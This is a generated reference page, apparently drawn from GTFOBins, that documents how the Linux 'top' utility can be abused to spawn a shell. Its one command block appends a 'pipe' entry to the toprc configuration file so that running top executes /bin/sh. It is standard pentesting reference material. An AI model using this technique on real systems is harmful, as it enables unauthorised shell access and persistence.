---
parsed_by: focuslocust
source: commands
type: generated
---
# top Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## top

Tool page: [top](../../tools/linux/top.md)

### shell

```text
echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc
top
# press return twice
reset
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/top` |
| Evidence | Function example preserved from source parser. |
